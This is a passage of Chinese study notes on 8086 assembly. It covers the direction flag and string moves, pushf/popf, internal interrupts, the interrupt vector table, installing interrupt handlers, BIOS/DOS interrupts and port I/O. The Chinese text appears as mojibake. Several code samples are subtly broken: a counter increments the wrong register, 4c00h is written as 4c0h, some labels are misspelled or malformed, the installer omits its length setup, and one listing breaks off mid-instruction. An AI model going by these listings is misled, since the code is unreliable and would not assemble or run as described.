8 çš„å­—èŠ‚çš„ä¸ªæ•°ï¼Œç”¨ ax ä¿å­˜ç»Ÿè®¡ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,data<br>mov ds,ax<br>mov ax,0<br>mov bx,0<br>mov cx,8<br>s:cmp byte ptr [bx],8<br>jnb next<br>inc ax<br>next:inc bx<br>loop s<br>//(ax)=2<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡ F000:0 å¤„ 32 ä¸ªå­—èŠ‚ä¸­ï¼Œå¤§å°åœ¨ [32,128] çš„æ•°æ®ä¸ªæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0f000h<br>mov ds,ax<br>mov bx,0<br>mov dx,0<br>mov cx,32<br>s:mov al,[bx]<br>cmp al,32<br>ja s0<br>cmp al,128<br>ja s0<br>inc bx<br>s0:inc bx<br>loop s<br></code></pre></td></tr></table></figure><h3 id="11-10-DF-æ ‡å¿—å’Œä¸²ä¼ é€æŒ‡ä»¤"><a href="#11-10-DF-æ ‡å¿—å’Œä¸²ä¼ é€æŒ‡ä»¤" class="headerlink" title="11.10 DF æ ‡å¿—å’Œä¸²ä¼ é€æŒ‡ä»¤"></a>11.10 DF æ ‡å¿—å’Œä¸²ä¼ é€æŒ‡ä»¤</h3><p>flag ç¬¬ 10 ä½ï¼Œæ–¹å‘æ ‡å¿—ä½ã€‚åœ¨ä¸²å¤„ç†æŒ‡ä»¤ä¸­ï¼Œæ§åˆ¶æ¯æ¬¡æ“ä½œå si ,di çš„å¢å‡</p><p>df &#x3D; 0  æ¯æ¬¡æ“ä½œå siã€di é€’å¢</p><p>df &#x3D;1  æ¯æ¬¡æ“ä½œå siã€di é€’å‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsb<br>ç›¸å½“äº:<br>((es)*16+(di))=((ds)*16)+si<br>å¦‚æœ df=0: (si)=(si)+1<br>(di)=(di)+1<br>å¦‚æœ df=1: (si)=(si)-1<br>(di)=(di)-1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsw<br>å°†ds:siæŒ‡å‘çš„å†…å­˜å•å…ƒä¸­çš„å­—é€å…¥es:diä¸­ï¼Œæ ¹æ®æ ‡å¿—å¯„å­˜å™¨dfä½çš„å€¼ï¼Œå°†siå’Œdié€’å¢2æˆ–é€’å‡2<br></code></pre></td></tr></table></figure><p>8086 CPU æä¾›ä¸¤æ¡æŒ‡ä»¤å¯¹ df ä½è¿›è¡Œè®¾ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cld æŒ‡ä»¤:å°†æ ‡å¿—å¯„å­˜å™¨çš„dfä½ç½®0<br>std æŒ‡ä»¤:å°†æ ‡å¿—å¯„å­˜å™¨dfä½ç½®1<br></code></pre></td></tr></table></figure><p>e.g ç”¨ä¸²ä¼ é€æŒ‡ä»¤ï¼Œå°† F000H æ®µä¸­çš„æœ€å 16 ä¸ªå­—ç¬¦å¤åˆ¶åˆ° data æ®µä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br> db 16 dup (0)<br>data ends<br>mov ax,0f000h<br>mov ds,ax<br>mov si,0ffffh//ds:si æŒ‡å‘ f000:ffff<br>mov ax,data<br>mov es,ax<br>mov di,15//es:di æŒ‡å‘ data:000f<br>mov cx,16//(cx)=16,rep å¾ªç¯16æ¬¡<br>std//è®¾ç½® df=1,é€†å‘ä¼ é€<br>rep movsb<br></code></pre></td></tr></table></figure><h3 id="11-11-push-å’Œ-popf"><a href="#11-11-push-å’Œ-popf" class="headerlink" title="11.11 push å’Œ popf"></a>11.11 push å’Œ popf</h3><p>pushf æ˜¯å°†æ ‡å¿—å¯„å­˜å™¨çš„å€¼å‹æ ˆï¼Œpopf æ˜¯å‡ºæ ˆé€å…¥æ ‡å¿—å¯„å­˜å™¨ä¸­</p><p>e.g  ï¼ˆax)&#x3D;ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>push ax<br>popf<br>mov ax,0fff0h<br>add ax,0010h<br>pushf<br>pop ax//0 0 0 0 of df if tf sf zf 0 af 0 pf 0 cf<br>//0 0 0 0 0  0  *  *  0 1  0  * 0 1  0  1<br>//ax=flag=000000**010*0101b<br>and al,11000101B//al=01000101b=45h<br>and ah,00001000B//ah=00000000b=0h<br>//ax=45h<br></code></pre></td></tr></table></figure><p>11.12 æ ‡å¿—å¯„å­˜å™¨åœ¨ Debug ä¸­çš„è¡¨ç¤º</p><table><thead><tr><th>æ ‡å¿—</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>of</td><td>OV</td><td>NV</td></tr><tr><td>sf</td><td>NG</td><td>PL</td></tr><tr><td>zf</td><td>ZR</td><td>NZ</td></tr><tr><td>pf</td><td>PE</td><td>PO</td></tr><tr><td>cf</td><td>CY</td><td>NC</td></tr><tr><td>df</td><td>DN</td><td>UP</td></tr></tbody></table><h1 id="åäºŒã€å†…ä¸­æ–­"><a href="#åäºŒã€å†…ä¸­æ–­" class="headerlink" title="åäºŒã€å†…ä¸­æ–­"></a>åäºŒã€å†…ä¸­æ–­</h1><h3 id="12-1-å†…ä¸­æ–­çš„äº§ç”Ÿ"><a href="#12-1-å†…ä¸­æ–­çš„äº§ç”Ÿ" class="headerlink" title="12.1 å†…ä¸­æ–­çš„äº§ç”Ÿ"></a>12.1 å†…ä¸­æ–­çš„äº§ç”Ÿ</h3><p>å¯¹äº 8086CPU ï¼Œæœ‰ä»¥ä¸‹æƒ…å†µä¼šäº§ç”Ÿä¸­æ–­</p><ul><li>é™¤æ³•é”™è¯¯ï¼Œæ¯”å¦‚ div æŒ‡ä»¤äº§ç”Ÿçš„é™¤æ³•æº¢å‡º</li><li>å•æ­¥æ‰§è¡Œ</li><li>into æŒ‡ä»¤</li><li>int æŒ‡ä»¤</li></ul><p>ä¸­æ–­æºåœ¨ 8086CPU ä¸­çš„ä¸­æ–­ç±»å‹</p><ul><li>é™¤æ³•é”™è¯¯ï¼š0</li><li>å•æ­¥æ‰§è¡Œï¼š1</li><li>into æŒ‡ä»¤ï¼š4</li><li>int æŒ‡ä»¤ï¼Œæ ¼å¼ä¸º int  nï¼Œn ä¸ºå­—èŠ‚å‹ç«‹å³æ•°ï¼Œæ˜¯æä¾›ç»™ CPU çš„ä¸­æ–­ç±»å‹ç </li></ul><h3 id="12-3-ä¸­æ–­å‘é‡è¡¨"><a href="#12-3-ä¸­æ–­å‘é‡è¡¨" class="headerlink" title="12.3 ä¸­æ–­å‘é‡è¡¨"></a>12.3 ä¸­æ–­å‘é‡è¡¨</h3><p>å¯¹äº 8086PC æœºï¼Œä¸­æ–­å‘é‡è¡¨æŒ‡å®šæ”¾åœ¨å†…å­˜åœ°å€ 0 å¤„ã€‚ä»å†…å­˜ 0000:0000 åˆ° 0000:03FF çš„ 1024 ä¸ªå•å…ƒä¸­å­˜æ”¾ç€ä¸­æ–­å‘é‡è¡¨ã€‚</p><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00<br>//3å·ä¸­æ–­æºå¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ä¸º: 0070:018B<br></code></pre></td></tr></table></figure><p><strong>ä¸€ä¸ªè¡¨é¡¹å­˜æ”¾ä¸€ä¸ªä¸­æ–­å‘é‡ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ï¼Œå…¥å£åœ°å€åŒ…æ‹¬æ®µåœ°å€å’Œåç§»åœ°å€ï¼Œä¸€ä¸ªè¡¨é¡¹å ä¸¤ä¸ªå­—ï¼Œé«˜åœ°å€å­˜æ”¾æ®µåœ°å€ï¼Œä½åœ°å€å­˜æ”¾åç§»åœ°å€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">å­˜å‚¨ N å·ä¸­æ–­æºå¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºå…¥å£çš„åç§»åœ°å€çš„å†…å­˜å•å…ƒçš„åœ°å€ä¸º:4N<br>æ®µåœ°å€çš„å†…å­˜å•å…ƒåœ°å€ä¸º:4N+2<br></code></pre></td></tr></table></figure><h3 id="12-4-ä¸­æ–­è¿‡ç¨‹"><a href="#12-4-ä¸­æ–­è¿‡ç¨‹" class="headerlink" title="12.4 ä¸­æ–­è¿‡ç¨‹"></a>12.4 ä¸­æ–­è¿‡ç¨‹</h3><p>8086CPU ä¸­æ–­è¿‡ç¨‹</p><ul><li>å–å¾—å­—æ®µç±»å‹ç  N</li><li>æ ‡å¿—å¯„å­˜å™¨å…¥æ ˆï¼ŒTF&#x3D;0,IF&#x3D;0</li><li>push CS</li><li>push IP</li><li>( IP ) &#x3D; ( N * 4 ) , ( CS ) &#x3D; ( N * 4 + 2 )</li></ul><h3 id="12-5-ä¸­æ–­å¤„ç†ç¨‹åºå’Œ-iret-æŒ‡ä»¤"><a href="#12-5-ä¸­æ–­å¤„ç†ç¨‹åºå’Œ-iret-æŒ‡ä»¤" class="headerlink" title="12.5 ä¸­æ–­å¤„ç†ç¨‹åºå’Œ iret æŒ‡ä»¤"></a>12.5 ä¸­æ–­å¤„ç†ç¨‹åºå’Œ iret æŒ‡ä»¤</h3><p>ä¸­æ–­å¤„ç†ç¨‹åºçš„ç¼–å†™æ–¹æ³•</p><ul><li>ä¿å­˜ç”¨åˆ°çš„å¯„å­˜å™¨</li><li>å¤„ç†ä¸­æ–­</li><li>æ¢å¤ç”¨åˆ°çš„å¯„å­˜å™¨</li><li>ç”¨ iret æŒ‡ä»¤è¿”å›</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop IP<br>pop CS<br>popf<br></code></pre></td></tr></table></figure><p><strong>åœ¨ä¸­æ–­è¿‡ç¨‹ä¸­ï¼Œå¯„å­˜å™¨å…¥æ ˆé¡ºåºæ˜¯æ ‡å¿—å¯„å­˜å™¨ï¼ŒCSï¼ŒIPã€‚iret å‡ºæ ˆé¡ºåºæ˜¯ IPï¼ŒCSï¼Œæ ‡å¿—å¯„å­˜å™¨</strong></p><h3 id="12-9-do0"><a href="#12-9-do0" class="headerlink" title="12.9 do0"></a>12.9 do0</h3><p>do0 ç¨‹åºçš„ä¸»è¦ä»»åŠ¡æ˜¯æ˜¾ç¤ºå­—ç¬¦ä¸²</p><p>e.g æ˜¾ç¤ºâ€œ overflowï¼â€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>code segment<br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset do0//è®¾ç½® ds:si æŒ‡å‘æºåœ°å€<br>mov ax,0<br>mov es,ax<br>mov di,200h//è®¾ç½® es:di æŒ‡å‘ç›®çš„åœ°å€<br>mov cx,offset do0end-offset do0//è®¾ç½® cx ä¸ºä¼ è¾“é•¿åº¦<br>cld//ä¼ è¾“æ–¹å‘ä¸ºæ­£<br>rep movsb<br>è®¾ç½®ä¸­æ–­å‘é‡è¡¨<br><br>mov ax,4c0h<br>int 21h<br><br>   do0:jmp short do0start//â€overflowï¼â€ä¸æ˜¯å¯æ‰§è¡Œä»£ç ï¼Œjmp è½¬ç§»åˆ°æ­£å¼ do0 ç¨‹åºã€‚é™¤æ³•å‘ç”Ÿæº¢å‡ºæ—¶ï¼ŒCPU æ‰§è¡Œ0:200å¤„çš„ jmp æŒ‡ä»¤ï¼Œè·³è¿‡åé¢å­—ç¬¦ä¸²ï¼Œè½¬åˆ°æ­£å¼ do0 ç¨‹åºæ‰§è¡Œ<br>   db &quot;overflow!&quot;<br>  do0start:mov ax,cs<br>  mov ds,ax<br>  mov si,202h//ds:siæŒ‡å‘å­—ç¬¦ä¸²ï¼Œjmp æŒ‡ä»¤å ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åç§»åœ°å€ä¸º 202h<br>  <br>  mov ax,0b800h<br>  mov es,ax<br>  mov di,12*160+36*2//es:diæŒ‡å‘æ˜¾å­˜ç©ºé—´çš„ä¸­é—´ä½ç½®<br>  <br>  mov cx,9//cxä¸ºå­—ç¬¦ä¸²é•¿åº¦<br>  s:mov al,[si]<br>  mov es:[di],al<br>  inc si<br>  add di,2<br>  loop s<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>de0end:nop<br>code:ends<br>end start<br>//å°†æ ‡å· do0 åˆ°æ ‡å· do0end ä¹‹é—´çš„å†…å®¹é€åˆ° 0000:0200å¤„  <br></code></pre></td></tr></table></figure><h3 id="12-10-è®¾ç½®ä¸­æ–­å‘é‡"><a href="#12-10-è®¾ç½®ä¸­æ–­å‘é‡" class="headerlink" title="12.10 è®¾ç½®ä¸­æ–­å‘é‡"></a>12.10 è®¾ç½®ä¸­æ–­å‘é‡</h3><p>å°† do0 çš„å…¥å£åœ°å€ 0:200 å†™å…¥ä¸­æ–­å‘é‡è¡¨çš„ 0 å·è¡¨é¡¹ä¸­ï¼Œä½¿ do0 æˆä¸º  0 å·ä¸­æ–­çš„ä¸­æ–­å¤„ç†ç¨‹åº</p><p>0 å·è¡¨é¡¹çš„åœ°å€ä¸º 0ï¼š0ï¼Œå…¶ä¸­ 0ï¼š0 å­—å•å…ƒå­˜æ”¾åç§»åœ°å€ï¼Œ0ï¼š2å­—å•å…ƒå­˜æ”¾æ®µåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>mov es,ax<br>mov word ptr es:[0*4],200h<br>mov word ptr es:[0*4+2],0<br></code></pre></td></tr></table></figure><h3 id="12-11-å•æ­¥ä¸­æ–­"><a href="#12-11-å•æ­¥ä¸­æ–­" class="headerlink" title="12.11 å•æ­¥ä¸­æ–­"></a>12.11 å•æ­¥ä¸­æ–­</h3><p>CPU åœ¨æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤åï¼Œå¦‚æœæ£€æµ‹åˆ°æ ‡å¿—å¯„å­˜å™¨çš„ TF ä½ä¸º 1ï¼Œåˆ™äº§ç”Ÿå•æ­¥ä¸­æ–­ï¼Œå¼•å‘ä¸­æ–­è¿‡ç¨‹ã€‚</p><ul><li>å–å¾—ä¸­æ–­ç±»å‹ç ä¸º 1</li><li>æ ‡å¿—å¯„å­˜å™¨å…¥æ ˆï¼ŒTFã€IF è®¾ç½®ä¸º 0</li><li>CSã€IP å…¥æ ˆ</li><li>ï¼ˆIPï¼‰&#x3D;ï¼ˆ1*4ï¼‰ï¼Œï¼ˆCSï¼‰&#x3D;ï¼ˆ1*4+2ï¼‰</li></ul><h1 id="åä¸‰ã€int-æŒ‡ä»¤"><a href="#åä¸‰ã€int-æŒ‡ä»¤" class="headerlink" title="åä¸‰ã€int æŒ‡ä»¤"></a>åä¸‰ã€int æŒ‡ä»¤</h1><h3 id="13-1-int-æŒ‡ä»¤"><a href="#13-1-int-æŒ‡ä»¤" class="headerlink" title="13.1 int æŒ‡ä»¤"></a>13.1 int æŒ‡ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">int n<br></code></pre></td></tr></table></figure><h3 id="13-2-ç¼–å†™ä¸­æ–­ä¾‹ç¨‹"><a href="#13-2-ç¼–å†™ä¸­æ–­ä¾‹ç¨‹" class="headerlink" title="13.2 ç¼–å†™ä¸­æ–­ä¾‹ç¨‹"></a>13.2 ç¼–å†™ä¸­æ–­ä¾‹ç¨‹</h3><p>å®‰è£…ä¸­æ–­ 7ch çš„ä¸­æ–­ä¾‹ç¨‹</p><p>åŠŸèƒ½ï¼šå°†ä¸€ä¸ªå…¨æ˜¯å­—æ¯ï¼Œä»¥ 0 ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œè½¬åŒ–ä¸ºå¤§å†™</p><p>å‚æ•°ï¼šds:si æŒ‡å‘å­—ç¬¦ä¸²çš„é¦–åœ°å€</p><p>eg. å°† data æ®µä¸­çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>data segment<br>db &#x27;conversation&#x27;,0<br>data ends<br>code segment<br>start:mov ax,data<br>mov ds,ax<br>mov si,0<br>int 7ch<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>å®‰è£…ç¨‹åºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br><br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset capital<br>cld<br>rep movsb<br><br>mov ax,0<br>mov es,ax<br>mov word ptr es:[7ch*4],200h<br>mov word ptr es:[7ch*4+2],0<br>mov ax,4c00h<br>int 21h<br><br> capital:push cx<br> push si<br> change:mov cl,[si]<br> mov ch,0<br> jcxz ok<br> and byte ptr [si],11011111b<br> inc si<br> jmp short change<br> ok:pop si<br> pop cx<br> iret<br>capitalend:nop<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="13-3-å¯¹-intã€iret-å’Œæ ˆçš„ç†è§£"><a href="#13-3-å¯¹-intã€iret-å’Œæ ˆçš„ç†è§£" class="headerlink" title="13.3 å¯¹ intã€iret å’Œæ ˆçš„ç†è§£"></a>13.3 å¯¹ intã€iret å’Œæ ˆçš„ç†è§£</h3><p>e.g åœ¨å±å¹•ä¸­æ˜¾ç¤º 80 ä¸ª â€œ ! â€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,0b800h<br> mov es,ax<br> mov di,160*12<br> <br> mov bx,offset s-offset se//ä»æ ‡å· se åˆ°æ ‡å· s çš„è½¬ç§»ä½ç§»<br> mov cx,80<br> s:mov byte ptr es:[di],&#x27;!&#x27;<br> add di,2<br> int 7ch//(cx)!=0ï¼Œè½¬ç§»åˆ°æ ‡å· s å¤„<br> se:nop<br> mov ax,4c0h<br> int 21h<br> code ends<br> end start<br></code></pre></td></tr></table></figure><h3 id="13-4-BIOS-å’Œ-DOS-æ‰€æä¾›çš„ä¸­æ–­ä¾‹ç¨‹"><a href="#13-4-BIOS-å’Œ-DOS-æ‰€æä¾›çš„ä¸­æ–­ä¾‹ç¨‹" class="headerlink" title="13.4 BIOS å’Œ DOS æ‰€æä¾›çš„ä¸­æ–­ä¾‹ç¨‹"></a>13.4 BIOS å’Œ DOS æ‰€æä¾›çš„ä¸­æ–­ä¾‹ç¨‹</h3><p>åœ¨ç³»ç»Ÿæ¿çš„ ROM ä½ç½®å­˜æ”¾ä¸€å¥—ç¨‹åºï¼ŒBIOS ï¼ˆåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ç¡¬ä»¶ç³»ç»Ÿçš„æ£€æµ‹å’Œåˆå§‹åŒ–ç¨‹åº</li><li>å¤–éƒ¨ä¸­æ–­å’Œå†…éƒ¨ä¸­æ–­çš„ä¸­æ–­ä¾‹ç¨‹</li><li>ç”¨äºç¡¬ä»¶è®¾å¤‡è¿›è¡Œ I&#x2F;O æ“ä½œçš„ä¸­æ–­ä¾‹ç¨‹</li><li>å…¶ä»–å’Œç¡¬ä»¶ç³»ç»Ÿç›¸å…³çš„ä¸­æ–­ä¾‹ç¨‹</li></ul><p>&#x2F;&#x2F;e.g ä¸‹é¢ç¨‹åºåœ¨ç¬¬2ã€4ã€6ã€8è¡Œæ˜¾ç¤º 4 å¥è‹±æ–‡è¯—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> s1:db &#x27;Good,better,best,&#x27;,&#x27;$&#x27;<br> s2:db &#x27;Never let it rest,&#x27;,&#x27;$&#x27;<br> s3:db &#x27;Till good is better,&#x27;,&#x27;$&#x27;<br> s4:db &#x27;And better,best.&#x27;,&#x27;$&#x27;<br> s:dw offset s1,offset s2,offset s3,offset s4<br>   row:db 2,4,6,8<br>   <br>  start:mov ax,cs<br>  mov ds,ax<br>  mov bx,offset s<br>  mov si,offset row<br>  mov cx,4<br>  ok:mov bh,0<br>  mov dh,<br>   <br></code></pre></td></tr></table></figure><h1 id="åå››ã€ç«¯å£"><a href="#åå››ã€ç«¯å£" class="headerlink" title="åå››ã€ç«¯å£"></a>åå››ã€ç«¯å£</h1><p>å¯„å­˜å™¨ç›¸åŒç‰¹ç‚¹ï¼š</p><ul><li>éƒ½å’Œ CPU æ€»çº¿ç›¸è¿ï¼Œé€šè¿‡å®ƒä»¬æ‰€åœ¨çš„èŠ¯ç‰‡è¿›è¡Œ</li><li>CPU å¯¹å®ƒä»¬è¿›è¡Œè¯»æˆ–å†™çš„æ—¶å€™éƒ½é€šè¿‡æ§åˆ¶çº¿å‘å®ƒä»¬æ‰€åœ¨çš„èŠ¯ç‰‡å‘å‡ºç«¯å£å·è¯»å†™å‘½ä»¤</li></ul><p>CPU å¯ä»¥ç›´æ¥è¯»å†™ä»¥ä¸‹åœ°æ–¹çš„æ•°æ®ï¼š</p><ul><li>CPU å†…éƒ¨çš„å¯„å­˜å™¨</li><li>å†…å­˜å•å…ƒ</li><li>ç«¯å£</li></ul><h3 id="14-1-ç«¯å£çš„è¯»å†™"><a href="#14-1-ç«¯å£çš„è¯»å†™" class="headerlink" title="14.1 ç«¯å£çš„è¯»å†™"></a>14.1 ç«¯å£çš„è¯»å†™</h3><p>1ï¼‰è®¿é—®å†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[8]//å‡è®¾æ‰§è¡Œå‰(ds)=0<br></code></pre></td></tr></table></figure><ul><li>CPU é€šè¿‡åœ°å€çº¿å°†åœ°å€ä¿¡æ¯ 8 å‘å‡º</li><li>CPU é€šè¿‡æ§åˆ¶çº¿å‘å‡ºå†…å­˜è¯»å‘½ä»¤ï¼Œé€‰ä¸­å­˜å‚¨å™¨èŠ¯ç‰‡ï¼Œé€šçŸ¥ä»–å®ƒè¦ä»ä¸­è¯»å–æ•°æ®</li><li>å­˜å‚¨å™¨å°† 8 å·å•å…ƒä¸­çš„æ•°æ®é€šè¿‡æ•°æ®çº¿é€å…¥ CPU</li></ul><p>2ï¼‰è®¿é—®ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,60h//ä» 60h å·ç«¯å£è¯»å…¥ä¸€ä¸ªå­—èŠ‚<br></code></pre></td></tr></table></figure><ul><li>CPU é€šè¿‡åœ°å€çº¿å°†åœ°å€ä¿¡æ¯ 60h å‘å‡º</li><li>CPU é€šè¿‡æ§åˆ¶çº¿å‘å‡ºç«¯å£å‘½ä»¤ï¼Œé€‰ä¸­ç«¯å£æ‰€åœ¨çš„èŠ¯ç‰‡ï¼Œé€šçŸ¥ä»–è¦ä»ä¸­è¯»å–æ•°æ®</li><li>ç«¯å£æ‰€åœ¨çš„èŠ¯ç‰‡å°† 60h ç«¯å£ä¸­çš„æ•°æ®é€šè¿‡æ•°æ®çº¿é€å…¥ CPU</li></ul><p>åœ¨ in å’Œ out æŒ‡ä»¤ä¸­ï¼Œåªèƒ½ç”¨ ax å’Œ al æ¥å­˜æ”¾ä»ç«¯å£ä¸­è¯»å…¥çš„æ•°æ®æˆ–è¦å‘é€åˆ°ç«¯å£çš„æ•°æ®ã€‚è®¿é—® 8 ä½ç«¯å£æ—¶ç”¨ al ,è®¿é—® 16 ä½ç”¨ ax</p><p>å¯¹0~255ä»¥å†…ç«¯å£è¿›è¡Œè¯»å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,20h//ä» 20h ç«¯å£è¯»å…¥ä¸€ä¸ªå­—èŠ‚<br>out 20h,al//å¾€ 20h ç«¯å£å†™å…¥ä¸€ä¸ªå­—èŠ‚<br></code></pre></td></tr></table></figure><p>å¯¹ 256~65535 çš„ç«¯å£è¿›è¡Œè¯»å†™ï¼Œç«¯å£å·æ”¾åœ¨ dx ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,3f8h//å°†ç«¯å£å· 3f8h é€å…¥ dx<br>in al,dx//è¯»å…¥<br>out dx,al//å†™å…¥<br></code></pre></td></tr></table></figure><h3 id="14-2-CMOS-RAM-èŠ¯ç‰‡"><a href="#14-2-CMOS-RAM-èŠ¯ç‰‡" class="headerlink" title="14.2 CMOS RAM èŠ¯ç‰‡"></a>14.2 CMOS RAM 